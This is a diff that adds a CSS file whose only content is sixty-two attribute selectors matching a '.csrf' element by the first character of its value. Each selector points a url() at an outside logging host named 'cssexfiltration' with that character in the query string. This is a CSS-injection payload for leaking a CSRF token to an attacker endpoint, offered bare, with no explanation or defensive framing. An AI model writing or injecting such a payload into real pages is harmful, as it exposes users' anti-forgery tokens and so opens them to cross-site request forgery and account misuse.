@@ -1,0 +1,186 @@
+.csrf[value^="a"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=a)
+}
+.csrf[value^="b"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=b)
+}
+.csrf[value^="c"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=c)
+}
+.csrf[value^="d"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=d)
+}
+.csrf[value^="e"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=e)
+}
+.csrf[value^="f"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=f)
+}
+.csrf[value^="g"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=g)
+}
+.csrf[value^="h"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=h)
+}
+.csrf[value^="i"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=i)
+}
+.csrf[value^="j"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=j)
+}
+.csrf[value^="k"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=k)
+}
+.csrf[value^="l"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=l)
+}
+.csrf[value^="m"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=m)
+}
+.csrf[value^="n"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=n)
+}
+.csrf[value^="o"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=o)
+}
+.csrf[value^="p"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=p)
+}
+.csrf[value^="q"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=q)
+}
+.csrf[value^="r"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=r)
+}
+.csrf[value^="s"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=s)
+}
+.csrf[value^="t"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=t)
+}
+.csrf[value^="u"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=u)
+}
+.csrf[value^="v"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=v)
+}
+.csrf[value^="w"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=w)
+}
+.csrf[value^="x"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=x)
+}
+.csrf[value^="y"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=y)
+}
+.csrf[value^="z"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=z)
+}
+.csrf[value^="A"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=A)
+}
+.csrf[value^="B"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=B)
+}
+.csrf[value^="C"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=C)
+}
+.csrf[value^="D"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=D)
+}
+.csrf[value^="E"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=E)
+}
+.csrf[value^="F"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=F)
+}
+.csrf[value^="G"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=G)
+}
+.csrf[value^="H"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=H)
+}
+.csrf[value^="I"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=I)
+}
+.csrf[value^="J"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=J)
+}
+.csrf[value^="K"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=K)
+}
+.csrf[value^="L"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=L)
+}
+.csrf[value^="M"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=M)
+}
+.csrf[value^="N"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=N)
+}
+.csrf[value^="O"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=O)
+}
+.csrf[value^="P"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=P)
+}
+.csrf[value^="Q"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=Q)
+}
+.csrf[value^="R"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=R)
+}
+.csrf[value^="S"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=S)
+}
+.csrf[value^="T"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=T)
+}
+.csrf[value^="U"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=U)
+}
+.csrf[value^="V"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=V)
+}
+.csrf[value^="W"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=W)
+}
+.csrf[value^="X"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=X)
+}
+.csrf[value^="Y"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=Y)
+}
+.csrf[value^="Z"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=Z)
+}
+.csrf[value^="0"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=0)
+}
+.csrf[value^="1"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=1)
+}
+.csrf[value^="2"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=2)
+}
+.csrf[value^="3"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=3)
+}
+.csrf[value^="4"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=4)
+}
+.csrf[value^="5"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=5)
+}
+.csrf[value^="6"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=6)
+}
+.csrf[value^="7"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=7)
+}
+.csrf[value^="8"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=8)
+}
+.csrf[value^="9"] {
+  --value: url(https://cssexfiltration.free.beeceptor.com/?value=9)
+}
